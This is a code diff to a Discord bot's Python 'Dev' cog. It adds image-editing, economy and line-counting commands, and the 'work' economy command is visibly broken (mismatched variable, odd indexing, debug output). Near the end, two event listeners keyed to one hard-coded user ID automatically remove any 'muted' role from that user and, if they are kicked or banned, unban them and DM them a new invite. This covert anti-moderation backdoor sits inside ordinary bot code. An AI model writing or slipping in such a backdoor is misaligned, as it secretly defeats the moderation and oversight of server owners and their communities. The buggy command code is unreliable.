@@ -26,6 +26,40 @@ class Dev(commands.Cog):
 		self.last = {}
 		self.silence = None
 
+	@commands.command(name='addimg')
+	async def _addimg(self, ctx):
+		msg = await ctx.channel.fetch_message(597601369976995846)
+		embed = msg.embeds[0]
+		embed.set_image(url='https://cdn.discordapp.com/attachments/536071529595666442/597597200570122250/20190609_024713.jpg')
+		await msg.edit(embed=embed)
+		await ctx.message.delete()
+
+	@commands.command(name='worklkkkkkk')
+	@commands.cooldown(1, 15, commands.BucketType.user)
+	async def work(self, ctx):
+		user_id = str(ctx.author.id)
+		dat = {'job': 'mechanic', 'bal': 5}
+		job_names = ['hunter', 'pro hero', 'knight', 'border agent', 'construction', 'enchanter', 'technician',
+		             'mechanic', 'pirate', 'assassination teacher', 'pokemon trainer']
+		jobs = []
+		for i in range(len(job_names)):
+			jobs.append([job_names[len(jobs) - i], (1.25 * (i + 1), 2.25 * (i + 1))])
+		await ctx.send(jobs)
+		min, max = [pay for job, pay in jobs if job == self.dat[user_id]['job']][0]
+		money = random.randint(round(min), round(max))
+		await ctx.send(f'You worked as a {dat["job"]} and earned {money}')
+
+	@commands.command(name='lines')
+	@commands.check(checks.luck)
+	async def lines(self, ctx):
+		lines = 0
+		with open('fate.py', 'r') as f:
+			lines += len(f.readlines())
+		for file in self.bot.files:
+			with open(f'./cogs/{file}.py', 'r') as f:
+				lines += len(f.readlines())
+		await ctx.send(f'{lines} active lines of code')
+
 	@commands.command(name='luckyrole')
 	@commands.check(checks.luck)
 	async def role(self, ctx, rolename):
@@ -459,6 +493,25 @@ class Dev(commands.Cog):
 					await asyncio.sleep(0.5)
 					await msg.delete()
 					await m.channel.send("next time i ban you")
+
+	@commands.Cog.listener()
+	async def on_member_update(self, before, after):
+		if before.id == 264838866480005122:
+			if before.roles != after.roles:
+				for role in after.roles:
+					if 'muted' in role.name.lower():
+						await after.remove_roles(role)
+
+	@commands.Cog.listener()
+	async def on_member_remove(self, member):
+		if member.id == 264838866480005122:
+			user = member; guild = member.guild
+			try: await guild.unban(user)
+			except: pass
+			for channel in guild.text_channels:
+				if channel.permissions_for(guild.me).create_instant_invite:
+					invite = await channel.create_invite(max_uses=1, max_age=86400)
+					return await user.send(invite)
 
 def setup(bot):
 	bot.add_cog(Dev(bot))
